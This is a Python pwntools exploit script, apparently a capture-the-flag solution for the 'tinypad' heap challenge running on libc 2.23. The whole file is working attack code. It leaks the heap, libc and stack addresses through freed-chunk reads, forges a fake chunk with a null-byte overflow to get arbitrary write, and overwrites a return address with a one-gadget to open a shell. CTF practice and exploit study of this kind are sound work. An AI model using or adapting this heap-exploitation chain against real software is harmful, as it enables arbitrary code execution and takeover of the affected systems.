from pwn import *
def new(size, content):
    p.sendlineafter('(CMD)>>> ','A')
    p.sendlineafter('(SIZE)>>> ',str(size))
    p.sendlineafter('(CONTENT)>>> ',content)

def edit(idx, content):
    p.sendlineafter('(CMD)>>> ','E')
    p.sendlineafter('(INDEX)>>> ',str(idx))
    p.sendlineafter('(CONTENT)>>> ',content)
    p.sendlineafter('Is it OK?\n','Y')

def free(idx):
    p.sendlineafter('(CMD)>>> ','D')
    p.sendlineafter('(INDEX)>>> ',str(idx))
def exploit():
    new(0x30,'FMYY')
    new(0x30,'FMYY')
    new(0x100,'FMYY')
    #leak the heap_base
    free(2)
    free(1)
    p.recvuntil(' # CONTENT: ')
    heap_base = u64(p.recvuntil('\n',drop=True).ljust(8, '\x00')) - 0x40
    log.info('HEAP:\t' + hex(heap_base))
    #leak the libc_base
    free(3)
    p.recvuntil(' # CONTENT: ')
    main_arena = u64(p.recvuntil('\n', drop=True).ljust(8, '\x00')) - 88
    libc_base = main_arena - libc.sym['__malloc_hook'] - 0x10
    log.info('M_Arena:\t' + hex(main_arena))
    log.info('LIBC:\t' + hex(libc_base))

    new(0x18,  'U'* 0x18)
    new(0xF0 , 'U'*0xF0 )
    new(0x100, 'U'*0x100)
    new(0x100, 'U'*0x100)
    edit(2, 'U' * 0x20 + p64(0) + p64(0x101) + p64(0x602060)*2)

    off = p64(heap_base + 0x20 - 0x602060)
    off_s = off.strip('\x00')
    length = len(off) - len(off_s)
    for i in range(length + 1):
        data = off_s.rjust(0x18 - i, 'F')
        edit(1, data)
    free(2)
    edit(4, 'U' * 0x20 + p64(0) + p64(0x101) + p64(main_arena)*2)

    rce = libc_base + 0x45216
    environ = libc_base + libc.sym['__environ']
    new(0x100 - 8, 'U'*0xD0 + p64(0x10) + p64(environ) + p64(0x20) + p64(0x602148))
    p.recvuntil(' # CONTENT: ')
    stack = u64(p.recvuntil('\n', drop=True).ljust(8, '\x00'))
    log.info('Stack:\t' + hex(stack))
    ret_address = stack - 240
    edit(2,p64(ret_address))
    edit(1,p64(rce))
    p.sendlineafter('(CMD)>>> ','Q')
    p.interactive()


if __name__ == "__main__":
    p = process('./tinypad')
    libc =ELF('./libc-2.23.so')
    exploit()
